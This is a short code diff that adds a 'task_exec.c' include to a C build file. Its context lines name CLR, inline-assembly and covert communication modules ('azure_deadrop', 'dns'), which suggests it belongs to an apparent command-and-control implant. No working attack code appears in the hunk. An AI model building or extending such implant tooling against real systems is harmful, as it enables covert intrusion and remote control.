@@ -44,6 +44,9 @@
 #include "bus/clr.c"
 #include "bus/inline_asm.c"
 
+/* Task execution — after bus modules so g_modmgr is visible */
+#include "task_exec.c"
+
 /* Comms channel implementations */
 #include "comms/azure_deadrop.c"
 #include "comms/dns.c"
